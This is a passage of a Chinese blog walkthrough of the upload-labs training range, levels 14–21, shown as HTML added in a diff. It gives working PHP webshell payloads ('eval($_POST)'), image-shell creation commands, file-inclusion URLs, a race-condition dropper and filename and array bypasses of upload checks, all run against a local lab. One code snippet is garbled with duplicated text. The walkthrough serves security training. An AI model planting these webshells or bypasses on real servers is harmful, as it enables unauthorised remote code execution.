+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001259.png" srcset="/img/loading.gif" lazyload></p>
+<p>换成16进制</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001457.png" srcset="/img/loading.gif" lazyload></p>
+<p>找到我们写的0（可以先照着右边找）</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002820.png" srcset="/img/loading.gif" lazyload></p>
+<p>改成00</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002452.png" srcset="/img/loading.gif" lazyload></p>
+<p>访问webshell.php，成功</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002919.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><p>安排任务了</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002584.png" srcset="/img/loading.gif" lazyload></p>
+<p>查看提示，说检查图片内容开头两个字节。</p>
+<p>PEG&#x2F;IFIF（常见的照片格式)：头两个字节为·0 xFF·0xD8。</p>
+<p>PNG（无损压缩格式)：头两个字节为·0x89·0x50。</p>
+<p>GIF（支持动画的图像格式)：头两个字节为·0x47·0x49。</p>
+<p>BMP(Windows位图格式)：头两个字节为·0x42·0x4D。</p>
+<p>TFF(标签图像文件格式)：头两个字节可以是不同的数值</p>
+<p>这里只用jpg图片做示范。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002283.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里可以使用cmd命令。</p>
+<p>在同时有图片和一句话木马的文件夹下打开cmd，然后使用以下命令。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">copy 图片名 /b + 一句话木马的文件名 /a webshell.jpg<br></code></pre></td></tr></table></figure>
+
+<p>意思是将一句话木马文件中的代码追加到图片中并重新生成一个叫webshell.php的代码。</p>
+<p>比如作者图片名就叫“重庆森林不在重庆.jpg”，一句话木马的文件名还是“webshell.php”。</p>
+<p>那么作者的命令为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">copy 重庆森林不在重庆.jpg /b + webshell.php /a webshell.jpg<br></code></pre></td></tr></table></figure>
+
+<p>下图表示图片马制作成功。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002393.png" srcset="/img/loading.gif" lazyload></p>
+<p>上传成功，是作者的头像</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002813.png" srcset="/img/loading.gif" lazyload></p>
+<p>那我们怎么执行恶意代码呢？</p>
+<p>直接访问显然是不行的，只会出现图片本身，要注意任务本身已经给出提示，要利用文件包含漏洞。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002472.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们使用靶机给我们的文件包含漏洞进行解析，这个文件包含的特性是会将我们所有包含进来的文件都以php进行解析</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002464.png" srcset="/img/loading.gif" lazyload></p>
+<p>请求时地址要加上file，注意图片名可能会被改。</p>
+<p>以作者的为例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//localhost/upload-labs/include.php?file=upload/4220241025001424.jpg</span><br></code></pre></td></tr></table></figure>
+
+<p>注意有的图片访问时报错，说是php语法错误之类的，可能是以php运行图片导致的问题。</p>
+<p>如果大家的图片确实没有好使的，可以用Windows自带的‘画图’做一张纯白色图片（不用做任何修改），然后保存。或者换种类型的图片也行。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002197.png" srcset="/img/loading.gif" lazyload></p>
+<p>png图片马过程和上面一样，这里就不多做赘述了。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002227.png" srcset="/img/loading.gif" lazyload></p>
+<p>GIF也一样</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002946.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><p>查看源码，关键函数是这个getimagesize</p>
+<p>getimagesize函数会对目标的十六进制的前几个字符串进行读取。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002169.png" srcset="/img/loading.gif" lazyload></p>
+<p>和上一关同理，按道理直接上传上一关的图马就行</p>
+<p>但是作者这里居然上传不了图片（找了几张正常图片也没上传成功）。</p>
+<p>大家可以在评论区讨论一下原因</p>
+<h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><p>知识补充： exif_imagetype()读取一个图像的第一个字节并检查其后缀名。</p>
+<p>返回值与getimage()函数返回的索引2相同，但是速度比getimage快得多。需要开启php_exif模块。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002826.png" srcset="/img/loading.gif" lazyload></p>
+<p>如果按作者上面文章配置的环境，默认已经开启，不需要手动开启。如果不是，接下来开启php_exif模块</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002899.png" srcset="/img/loading.gif" lazyload></p>
+<p>所以还是可以用之前的图片马绕过，并使用文件包含漏洞解析图片马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//localhost/upload-labs/include.php?file=upload/3620241025170953.jpg</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002544.png" srcset="/img/loading.gif" lazyload></p>
+<p>其他格式也一样，不在这里演示了</p>
+<h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><p>查看提示发现有重新渲染，查看源码。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002896.png" srcset="/img/loading.gif" lazyload></p>
+<p>imagecreatefromjpeg（）等函数会使用上传的图片生成新的图片，即二次渲染（二次渲染‌是指上传的文件（如图片）在显示之前会进行二次处理，包括解码、转换等操作，这可能会导致其中的恶意代码失效。）。</p>
+<p>所以二次渲染会创建一个新图象，成功则返回图像标识符&#x2F;图像资源，失败则返回false，从而会导致图片马的数据丢失，上传的图片马无法执行。</p>
+<p>二次渲染是后端重写文件内容，常见会用到的函数有：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">basename</span>(path[,suffix])没指定suffix则返回后缀名，有则不返回指定的后缀名<br> <br><span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-keyword">string</span>,char)函数查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符。<br> <br><span class="hljs-title function_ invoke__">imagecreatefromgif</span>()：创建一块画布，并从 GIF 文件或 URL 地址载入一副图像<br> <br><span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>()：创建一块画布，并从 JPEG 文件或 URL 地址载入一副图像<br> <br><span class="hljs-title function_ invoke__">imagecreatefrompng</span>()：创建一块画布，并从 PNG 文件或 URL 地址载入一副图像<br></code></pre></td></tr></table></figure>
+
+<p>按照前几关的方式上传，可以上传，但是包含漏洞无法解析。原因就是二次渲染将图片马里面的php代码打乱了。</p>
+<p>对于做文件上传之二次渲染建议用GIF图片，制作会更简单一点。</p>
+<p>对GIF，我们需要把原图和修改后的图片进行比较，看哪里没有被打散：</p>
+<p>上传正常的GIF图片，然后下载回显的图片，用010Editor编辑器进行对比两个GIF图片内容，找到相同的地方（指的是上传前和上传后，两张图片的部分Hex仍然保持不变的位置）</p>
+<p>上传前：</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002835.png" srcset="/img/loading.gif" lazyload></p>
+<p>上传后：</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002488.png" srcset="/img/loading.gif" lazyload></p>
+<p>在蓝色框里插入PHP一句话，上传后，仍未被打散</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022002095.png" srcset="/img/loading.gif" lazyload></p>
+<p>如果肉眼对比不方便的话，似乎也可以复制两个文件的二进制形式，然后在burpsuite的Comparer中对比；也可以用beyond compare这一工具查看两张图，直接去对比打散情况。</p>
+<p>制作好后，访问图片</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//localhost/upload-labs/include.php?file=upload/26259.gif</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003714.png" srcset="/img/loading.gif" lazyload></p>
+<p>至于png以及jpg，就相对而言没有这么简单，大家要是有兴趣可以参考这篇文章：</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2657?time__1311=n4+xnieDw4uneG=D/WT4BIpxGTeWq5KqhD&alichlgref=https://xz.aliyun.com/t/5791?time__1311=n4%252BxnD07DtKxcDIx7qGNWpDUhAFuwY6Nx#toc-6" title="文章 - upload-labs之pass 16详细分析 - 先知社区">文章 - upload-labs之pass 16详细分析 - 先知社区</a></p>
+<h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><p>提示说要代码审计</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003473.png" srcset="/img/loading.gif" lazyload></p>
+<p>分析代码，可以看到他的逻辑是先对文件进行了上传操作，然后在判断文件的扩展名在不在白名单中，如若在，进行重命名；不在，则对其进行删除。</p>
+<p>也就是说如果我们上传php文件，它会先上传，然后判断不符合，再删除我们的木马。</p>
+<p>这么看来如果我们还是上传一个图片马的话，网站依旧存在文件包含漏洞我们还是可以进行利用。</p>
+<p>直接就出了，</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003384.png" srcset="/img/loading.gif" lazyload></p>
+<p>但假设这一题没有文件包含漏洞的话，那我们怎么办？</p>
+<p>尽管我们创上传的web.php这一文件不可避免的要删掉，但它终归是上传了。只要它上传了，我们就可以想方设法利用它。</p>
+<p>我们可以想方法在web.php被删除之前执行它，从而通过web.php去生成一个webshell.php。</p>
+<p>如何做呢？</p>
+<p>先制作一个web.php，写上如下内容：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;../upload/webshell.php&#x27;</span>, <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;1&quot;]); ?&gt;&#x27;</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>这段代码的作用：</p>
+<p>一旦访问到我们写的web.php，就会在upload目录下生成一个webshell.php，并写入<code>&lt;?php @eval($_POST[&quot;1&quot;]); ?&gt;</code>，这样生成的webshell.php是不会被程序删除掉的。</p>
+<p>要注意web.php和webshell.php是不一样的，web.php是我们制作的的，而webshell.php是访问并执行web.php后生成的。</p>
+<p>所以如果我们能在上传的web.php被删除之前访问，那么就会生成新的一句话木马webshell.php，要知道代码在执行的时候也是需要时间的，尽管这个时间特别短，只要我们能利用住，也会成功的。这个就叫做条件竞争上传绕过。</p>
+<p>我们可以利用burpsuite，把web.php文件通过burp一直不停的重放上传，然后我们再开一个线程去一直访问我们的web.php文件，总会有那么一瞬间是还没来得及删除就可以被访问到的，那我们就成功了。</p>
+<p>下面是具体步骤：</p>
+<p>首先，先上传我们的web.php文件，用burp进行拦截，然后放到重放模块下，进行多次上传</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003641.png" srcset="/img/loading.gif" lazyload></p>
+<p>一开始会自动选出payload，但是我们不需要，我们只要不断上传即可，所以点击Clear去掉payload</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003931.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后将payload类型设为空，意思是上传空的payload</p>
+<p>重发请求数值大一些，这里作者设置为6000，不够的话可以选择下面的Continue indefinitely去一直请求</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003386.png" srcset="/img/loading.gif" lazyload></p>
+<p>再抓取一个我们访问上传的web.php文件的，也放到bp的重发包上面</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003426.png" srcset="/img/loading.gif" lazyload></p>
+<p>和之前一样，这里作者把重发数值设置为12000</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003565.png" srcset="/img/loading.gif" lazyload></p>
+<p>这样就一边上传，一边请求了，只要有一次访问得到，那么就会在upload文件夹里创建webshell.php。</p>
+<p>经过条件竞争，是有机会访问到的。</p>
+<p>我们直接用蚁剑连接</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003140.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h2><p>从源码来看的话，服务器先是将文件后缀跟白名单做了对比，然后检查了文件大小以及文件是否已经存在。</p>
+<p>这么看来的话，php是不能上传了，只能上传图片马了，而且需要在图片马没有被重命名之前访问它。</p>
+<p>要让图片马能够执行还要配合其他漏洞，比如文件包含。</p>
+<p>这道题直接利用文件包含和图片马也可以成功。但题目让我们多绕了一步，为了训练，这里还是用条件竞争。</p>
+<p>（作者试过文件包含和图片马可行）</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003575.png" srcset="/img/loading.gif" lazyload></p>
+<p>但我们还是按照题目走吧。</p>
+<p>注意这次上传图片的位置变了。我们随便上传一张图片，右击复制其地址：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//localhost/upload-labs/upload1729991308.jpg</span><br></code></pre></td></tr></table></figure>
+
+<p>发现图片直接上传在upload-labs文件夹下，和之前不一样。</p>
+<p>这里我们修改一下上传地址，改成之前的upload文件夹下</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003907.png" srcset="/img/loading.gif" lazyload></p>
+<p>还是制作图片马：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">copy 无标题.jpg /b + RaceCondition.php /a RaceCondition.jpg<br></code></pre></td></tr></table></figure>
+
+<p>无标题.jpg是作者随便做了一张图片，RaceCondition.php是一句话木马文件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;../upload-labs/upload/webshell.php&#x27;</span>, <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;1&quot;]); ?&gt;&#x27;</span>); <span class="hljs-meta">?&gt;</span>xxxxxxxxxx <span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;../upload-labs/upload/webshell.php&#x27;</span>, <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;1&quot;]); ?&gt;&#x27;</span>); <span class="hljs-meta">?&gt;</span><span class="hljs-string">&#x27;); ?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>剩下步骤和上一题一样。</p>
+<p>先抓包上传请求</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003277.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003226.png" srcset="/img/loading.gif" lazyload></p>
+<p>再抓包访问请求（别忘了利用文件包含）</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022005710.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003012.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003286.png" srcset="/img/loading.gif" lazyload></p>
+<p>成功</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022003783.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><p>看提示</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022004939.png" srcset="/img/loading.gif" lazyload></p>
+<p>看源码，发现没有对上传的文件做判断，只对用户输入的文件名做判断</p>
+<p>说白了，它只检查我们输入的那个文件名，不检查文件原来的名字</p>
+<p>由于move_uploaded_file()有这么一个特性，会忽略掉文件末尾的 &#x2F;.</p>
+<p>所以我们后面加个点就可以绕过黑名单，上传webshell.php，输入名字为webshell.php.</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022004917.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022004666.png" srcset="/img/loading.gif" lazyload></p>
+<p>访问成功</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//localhost/upload-labs/upload/webshell.php</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022004914.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Pass-21"><a href="#Pass-21" class="headerlink" title="Pass-21"></a>Pass-21</h2><p>我们不仅可以上传文件，还可以决定保存名称。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022004610.png" srcset="/img/loading.gif" lazyload></p>
+<p>这一关是数组绕过，利用了count()函数漏洞。</p>
+<p>count()函数漏洞原理：</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022004897.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们这里举个例子，</p>
+<p>现自定义一个数组 arr[]，定义arr[0]&#x3D;0，arr[3]&#x3D;3,</p>
+<p>此时arr这一数组共有两个元素，count(arr)的值为2，则arr[count(arr)]即为arr[2]，但是arr[2]未定义，即为一个空值，</p>
+<p>若使用count()函数本来是想指向arr数组的最后一个元素，此时却指向arr[2]，形成数组漏洞。</p>
+<p>那我们再来看这道题。</p>
+<p>先给出一些函数解释，以免大家审计代码的时候读不懂：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">explode</span>(a,b)函数以a为分割，把b转为数组。<br> <br><span class="hljs-title function_ invoke__">reset</span>()函数把数组内部指针移动到数组第一个元素，并返回值。<br> <br><span class="hljs-title function_ invoke__">end</span>() 把数组内部指针移动到数组最后一个元素，并返回值。<br></code></pre></td></tr></table></figure>
+
+<p>count()函数数组元素的数量。</p>
+<p>然后我们看下面这段代码可以知道最终的文件名是由数组的第一个和最后一个元素拼接而成。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022004429.png" srcset="/img/loading.gif" lazyload></p>
+<p>正常情况来说，我们是没办法绕过的，但是这里有个判断：如果不是数组，就自己拆成数组。</p>
+<p>隐藏含义就是说，我们也可以自己传数组进入。这就给了我们利用count()函数漏洞的机会。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022004604.png" srcset="/img/loading.gif" lazyload></p>
+<p>下面我们对源代码进行整体的分析：</p>
+<p>——&gt; 验证上传路径是否存在</p>
+<p>——&gt; 验证[‘upload_file’]的content-type是否合法（MIME检查，见第二关）</p>
+<p>——&gt; 判断POST参数save_name（即我们自己输入的文件名）是否为空。如果为空，$file就等于上传文件原本的名字；不为空，$file就等于我们输入的那个文件名（即$file &#x3D; save_name）。</p>
+<p>——&gt;判断file是不是数组，不是的话则使用explode(‘.’, strtolower($file))对file进行切割，将file变为一个数组</p>
+<p>——&gt; 用end()函数取后缀进行白名单检查，只有jpg、png、gif才可以通过</p>
+<p>——&gt; 数组第一位和$file[count($file) - 1]进行拼接，产生保存文件名file_name</p>
+<p>——&gt; 上传文件</p>
+<p>可知，其中有两次检查和一次改名</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022004209.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后我们针对源代码进行绕过，提交一句话木马webshell.php，保存名称也写webshell.php</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022004182.png" srcset="/img/loading.gif" lazyload></p>
+<p>抓包，开始操作</p>
+<p>修改content-type为image&#x2F;jpeg（绕过MIME检查）</p>
+<p>修改POST参数（save_name）为数组类型：</p>
+<p>索引[0]为我们输入的名字‘webshell.php‘，</p>
+<p>索引[2]我们自己添加一条数据，为‘jpg’。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022004504.png" srcset="/img/loading.gif" lazyload></p>
+<p>Forward放包</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022004219.png" srcset="/img/loading.gif" lazyload></p>
+<p>访问一下，成功</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022004160.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们这里复盘一下，我们先是修改content-type绕过MIME检查。</p>
+<p>然后修改POST参数（save_name）为数组类型，save_name[0]为 ‘webshell.php‘，save_name[2]为’jpg’。</p>
+<p>这样的话<code>$ext = end($file) = $file[2] = save_name[2] = jpg</code>通过白名单，而且<code>$file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1] = reset($file) . &#39;.&#39; . $file[2-1] = $file[0] . &#39;.&#39; . $file[1]</code>，又<code>$file[1]</code>值为空，所以<code>$file_name = $file[0] . &#39;.&#39; . = save_name[0] . &#39;.&#39; . = webshell.php.</code>，然后webshell.php.最后的点会自动去掉，文件名最终为webshell.php，和我们输入的一样，解决了文件改名的问题。</p>
+<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_64620936/article/details/136591580" title="Upload-labs 1-20关靶场通关攻略(全网最全最完整)_upload靶场-CSDN博客">Upload-labs 1-20关靶场通关攻略(全网最全最完整)_upload靶场-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53003652/article/details/129969951" title="upload-labs详解1-19关通关全解（最全最详细一看就会）-CSDN博客">upload-labs详解1-19关通关全解（最全最详细一看就会）-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_74013288/article/details/134104006" title="文件上传漏洞靶场（upload-labs）通关-CSDN博客">文件上传漏洞靶场（upload-labs）通关-CSDN博客</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web/" class="category-chain-item">Web</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/wp/" class="print-no-link">#wp</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>upload-labs通关全详解</div>
+      <div>http://example.com/2025/05/04/16upload-labs通关全详解/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>sangnigege</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年5月4日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/05/04/17%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" title="文件上传学习总结">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">文件上传学习总结</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/05/04/15upload-labs%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/" title="upload-labs安装与配置">
+                        <span class="hidden-mobile">upload-labs安装与配置</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"TKccC2BvrQ0jKroA5aUdv8tr-gzGzoHsz","appKey":"rSHs3EnI9lT7nQwv5J7fcBnq","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
